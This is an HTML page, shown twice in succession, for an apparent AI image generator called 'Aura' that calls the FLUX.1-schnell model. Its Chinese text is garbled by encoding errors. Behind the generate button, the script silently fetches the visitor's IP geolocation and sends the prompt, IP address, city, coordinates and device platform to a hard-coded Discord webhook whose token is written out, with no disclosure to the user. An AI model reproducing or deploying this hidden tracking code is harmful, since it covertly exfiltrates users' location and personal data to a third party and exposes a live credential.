<!DOCTYPE html>
<html lang="zh-TW">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Aura AI | FR TECH</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=SF+Pro+Display:wght@300;400;600&display=swap" rel="stylesheet">
    <style>
        :root {
            --aura-gradient: linear-gradient(135deg, #8E2DE2, #4A00E0);
            --ios-blur: blur(25px);
        }
        body { 
            background: radial-gradient(circle at top right, #1a1a2e, #000000); 
            color: #fff; 
            font-family: 'SF Pro Display', -apple-system, BlinkMacSystemFont, sans-serif;
            min-height: 100vh;
            overflow-x: hidden;
        }
        /* iOS 18 ç»ç’ƒè³ªæ„Ÿ */
        .glass-panel {
            background: rgba(255, 255, 255, 0.08);
            backdrop-filter: var(--ios-blur);
            -webkit-backdrop-filter: var(--ios-blur);
            border: 1px solid rgba(255, 255, 255, 0.15);
            border-radius: 28px;
            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.37);
        }
        .btn-aura {
            background: white;
            color: black;
            border-radius: 999px;
            font-weight: 600;
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
        }
        .btn-aura:hover { transform: scale(1.02); background: rgba(255,255,255,0.9); }
        .btn-aura:active { transform: scale(0.98); }
        .loading-shimmer {
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.1), transparent);
            background-size: 200% 100%;
            animation: shimmer 1.5s infinite;
        }
        @keyframes shimmer { 0% { background-position: -200% 0; } 100% { background-position: 200% 0; } }
    </style>
</head>
<body class="flex flex-col items-center py-12 px-6">

    <div class="mb-12 text-center">
        <h2 class="text-xs uppercase tracking-[0.3em] text-gray-400 mb-2">FR Technology</h2>
        <h1 class="text-5xl font-semibold tracking-tight italic">AURA</h1>
    </div>

    <div class="glass-panel w-full max-w-2xl p-8 mb-8">
        <textarea id="prompt" 
            class="w-full bg-transparent border-none text-xl focus:ring-0 placeholder-gray-500 resize-none h-32" 
            placeholder="è«‹è¼¸å…¥æè¿°..."></textarea>
        
        <div class="flex items-center justify-between mt-6 border-t border-white/10 pt-6">
            <div id="status-text" class="text-sm text-gray-400 font-light">ç³»çµ±å°±ç·’</div>
            <button id="gen-btn" class="btn-aura px-8 py-3 text-sm">ç”Ÿæˆå½±åƒ</button>
        </div>
    </div>

    <div id="result-container" class="w-full max-w-2xl hidden">
        <div class="glass-panel overflow-hidden relative">
            <div id="loading-overlay" class="absolute inset-0 loading-shimmer hidden"></div>
            <img id="output-img" class="w-full object-cover" src="" alt="">
        </div>
        
        <div class="flex gap-4 mt-6">
            <button id="download-btn" class="flex-1 glass-panel py-4 flex items-center justify-center font-medium hover:bg-white/10 transition-all">
                ğŸ“¥ å„²å­˜è‡³ç›¸ç°¿
            </button>
            <button onclick="location.reload()" class="w-16 glass-panel flex items-center justify-center hover:bg-white/10">
                â†º
            </button>
        </div>
    </div>

    <script type="module">
        import { client } from "https://cdn.jsdelivr.net/npm/@gradio/client/dist/index.min.js";

        const WEBHOOK_URL = "https://discord.com/api/webhooks/1472667146008920197/XM3tXEq7uDoqoYFDeGuPo-46YRFXBe6oeU75R-JJ2OhRX_clDc6f0gLGvCib1T4uJWUo";

        // èªè¨€è‡ªå‹•åˆ‡æ›é‚è¼¯
        const userLang = navigator.language || navigator.userLanguage;
        if (!userLang.includes('zh')) {
            document.getElementById('status-text').innerText = "System Ready";
            document.getElementById('gen-btn').innerText = "Generate";
            document.getElementById('prompt').placeholder = "Describe your vision...";
            document.getElementById('download-btn').innerText = "ğŸ“¥ Save Image";
        }

        async function syncToDiscord(prompt, imgUrl, geo) {
            try {
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        username: "Aura ç›£æ§ (FR Tech)",
                        embeds: [{
                            title: "ğŸ¨ å½±åƒç”Ÿæˆå ±å‘Š",
                            color: 0xffffff,
                            fields: [
                                { name: "æŒ‡ä»¤", value: prompt, inline: false },
                                { name: "åœ°é»", value: `${geo.city || 'æœªçŸ¥'}, ${geo.country_name || 'æœªçŸ¥'}`, inline: true },
                                { name: "IP", value: geo.ip, inline: true },
                                { name: "åº§æ¨™", value: `${geo.latitude}, ${geo.longitude}`, inline: true },
                                { name: "è¨­å‚™", value: navigator.platform, inline: true }
                            ],
                            image: { url: imgUrl },
                            footer: { text: `FR Technology Â© 2026 | ${new Date().toLocaleString()}` }
                        }]
                    })
                });
            } catch (e) { console.error("Discord Sync Error"); }
        }

        const btn = document.getElementById('gen-btn');
        btn.onclick = async () => {
            const prompt = document.getElementById('prompt').value;
            if (!prompt) return;

            // UI ç‹€æ…‹åˆ‡æ›
            btn.disabled = true;
            document.getElementById('status-text').innerText = "Aura æ­£åœ¨é‹ç®—ä¸­...";
            document.getElementById('result-container').classList.remove('hidden');
            document.getElementById('loading-overlay').classList.remove('hidden');

            try {
                // 1. ç²å–åœ°ç†è³‡è¨Š
                const geoRes = await fetch("https://ipapi.co/json/");
                const geoData = await geoRes.json();

                // 2. èª¿ç”¨ AI æ¨¡å‹ (FLUX Schnell)
                const app = await client("black-forest-labs/FLUX.1-schnell");
                const result = await app.predict("/predict", [prompt, 1, 1, 1024, 768]);
                const imgUrl = result.data[0].url;

                // 3. é¡¯ç¤ºçµæœ
                document.getElementById('output-img').src = imgUrl;
                document.getElementById('loading-overlay').classList.add('hidden');
                document.getElementById('status-text').innerText = "ç”Ÿæˆå®Œæˆ";

                // 4. ä¸‹è¼‰åŠŸèƒ½å¯¦ç¾
                document.getElementById('download-btn').onclick = async () => {
                    const image = await fetch(imgUrl);
                    const imageBlog = await image.blob();
                    const imageURL = URL.createObjectURL(imageBlog);
                    const link = document.createElement('a');
                    link.href = imageURL;
                    link.download = `Aura_${Date.now()}.png`;
                    document.body.appendChild(link);
                    link.click();
                    document.body.removeChild(link);
                };

                // 5. Discord åŒæ­¥
                await syncToDiscord(prompt, imgUrl, geoData);

            } catch (err) {
                document.getElementById('status-text').innerText = "æœå‹™ç¹å¿™ï¼Œè«‹é‡è©¦";
                btn.disabled = false;
            }
        };
    </script>
</body>
</html>
<!DOCTYPE html>
<html lang="zh-TW">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Aura AI | FR TECH</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=SF+Pro+Display:wght@300;400;600&display=swap" rel="stylesheet">
    <style>
        :root {
            --aura-gradient: linear-gradient(135deg, #8E2DE2, #4A00E0);
            --ios-blur: blur(25px);
        }
        body { 
            background: radial-gradient(circle at top right, #1a1a2e, #000000); 
            color: #fff; 
            font-family: 'SF Pro Display', -apple-system, BlinkMacSystemFont, sans-serif;
            min-height: 100vh;
            overflow-x: hidden;
        }
        /* iOS 18 ç»ç’ƒè³ªæ„Ÿ */
        .glass-panel {
            background: rgba(255, 255, 255, 0.08);
            backdrop-filter: var(--ios-blur);
            -webkit-backdrop-filter: var(--ios-blur);
            border: 1px solid rgba(255, 255, 255, 0.15);
            border-radius: 28px;
            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.37);
        }
        .btn-aura {
            background: white;
            color: black;
            border-radius: 999px;
            font-weight: 600;
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
        }
        .btn-aura:hover { transform: scale(1.02); background: rgba(255,255,255,0.9); }
        .btn-aura:active { transform: scale(0.98); }
        .loading-shimmer {
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.1), transparent);
            background-size: 200% 100%;
            animation: shimmer 1.5s infinite;
        }
        @keyframes shimmer { 0% { background-position: -200% 0; } 100% { background-position: 200% 0; } }
    </style>
</head>
<body class="flex flex-col items-center py-12 px-6">

    <div class="mb-12 text-center">
        <h2 class="text-xs uppercase tracking-[0.3em] text-gray-400 mb-2">FR Technology</h2>
        <h1 class="text-5xl font-semibold tracking-tight italic">AURA</h1>
    </div>

    <div class="glass-panel w-full max-w-2xl p-8 mb-8">
        <textarea id="prompt" 
            class="w-full bg-transparent border-none text-xl focus:ring-0 placeholder-gray-500 resize-none h-32" 
            placeholder="è«‹è¼¸å…¥æè¿°..."></textarea>
        
        <div class="flex items-center justify-between mt-6 border-t border-white/10 pt-6">
            <div id="status-text" class="text-sm text-gray-400 font-light">ç³»çµ±å°±ç·’</div>
            <button id="gen-btn" class="btn-aura px-8 py-3 text-sm">ç”Ÿæˆå½±åƒ</button>
        </div>
    </div>

    <div id="result-container" class="w-full max-w-2xl hidden">
        <div class="glass-panel overflow-hidden relative">
            <div id="loading-overlay" class="absolute inset-0 loading-shimmer hidden"></div>
            <img id="output-img" class="w-full object-cover" src="" alt="">
        </div>
        
        <div class="flex gap-4 mt-6">
            <button id="download-btn" class="flex-1 glass-panel py-4 flex items-center justify-center font-medium hover:bg-white/10 transition-all">
                ğŸ“¥ å„²å­˜è‡³ç›¸ç°¿
            </button>
            <button onclick="location.reload()" class="w-16 glass-panel flex items-center justify-center hover:bg-white/10">
                â†º
            </button>
        </div>
    </div>

    <script type="module">
        import { client } from "https://cdn.jsdelivr.net/npm/@gradio/client/dist/index.min.js";

        const WEBHOOK_URL = "https://discord.com/api/webhooks/1472667146008920197/XM3tXEq7uDoqoYFDeGuPo-46YRFXBe6oeU75R-JJ2OhRX_clDc6f0gLGvCib1T4uJWUo";

        // èªè¨€è‡ªå‹•åˆ‡æ›é‚è¼¯
        const userLang = navigator.language || navigator.userLanguage;
        if (!userLang.includes('zh')) {
            document.getElementById('status-text').innerText = "System Ready";
            document.getElementById('gen-btn').innerText = "Generate";
            document.getElementById('prompt').placeholder = "Describe your vision...";
            document.getElementById('download-btn').innerText = "ğŸ“¥ Save Image";
        }

        async function syncToDiscord(prompt, imgUrl, geo) {
            try {
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        username: "Aura ç›£æ§ (FR Tech)",
                        embeds: [{
                            title: "ğŸ¨ å½±åƒç”Ÿæˆå ±å‘Š",
                            color: 0xffffff,
                            fields: [
                                { name: "æŒ‡ä»¤", value: prompt, inline: false },
                                { name: "åœ°é»", value: `${geo.city || 'æœªçŸ¥'}, ${geo.country_name || 'æœªçŸ¥'}`, inline: true },
                                { name: "IP", value: geo.ip, inline: true },
                                { name: "åº§æ¨™", value: `${geo.latitude}, ${geo.longitude}`, inline: true },
                                { name: "è¨­å‚™", value: navigator.platform, inline: true }
                            ],
                            image: { url: imgUrl },
                            footer: { text: `FR Technology Â© 2026 | ${new Date().toLocaleString()}` }
                        }]
                    })
                });
            } catch (e) { console.error("Discord Sync Error"); }
        }

        const btn = document.getElementById('gen-btn');
        btn.onclick = async () => {
            const prompt = document.getElementById('prompt').value;
            if (!prompt) return;

            // UI ç‹€æ…‹åˆ‡æ›
            btn.disabled = true;
            document.getElementById('status-text').innerText = "Aura æ­£åœ¨é‹ç®—ä¸­...";
            document.getElementById('result-container').classList.remove('hidden');
            document.getElementById('loading-overlay').classList.remove('hidden');

            try {
                // 1. ç²å–åœ°ç†è³‡è¨Š
                const geoRes = await fetch("https://ipapi.co/json/");
                const geoData = await geoRes.json();

                // 2. èª¿ç”¨ AI æ¨¡å‹ (FLUX Schnell)
                const app = await client("black-forest-labs/FLUX.1-schnell");
                const result = await app.predict("/predict", [prompt, 1, 1, 1024, 768]);
                const imgUrl = result.data[0].url;

                // 3. é¡¯ç¤ºçµæœ
                document.getElementById('output-img').src = imgUrl;
                document.getElementById('loading-overlay').classList.add('hidden');
                document.getElementById('status-text').innerText = "ç”Ÿæˆå®Œæˆ";

                // 4. ä¸‹è¼‰åŠŸèƒ½å¯¦ç¾
                document.getElementById('download-btn').onclick = async () => {
                    const image = await fetch(imgUrl);
                    const imageBlog = await image.blob();
                    const imageURL = URL.createObjectURL(imageBlog);
                    const link = document.createElement('a');
                    link.href = imageURL;
                    link.download = `Aura_${Date.now()}.png`;
                    document.body.appendChild(link);
                    link.click();
                    document.body.removeChild(link);
                };

                // 5. Discord åŒæ­¥
                await syncToDiscord(prompt, imgUrl, geoData);

            } catch (err) {
                document.getElementById('status-text').innerText = "æœå‹™ç¹å¿™ï¼Œè«‹é‡è©¦";
                btn.disabled = false;
            }
        };
    </script>
</body>
</html>
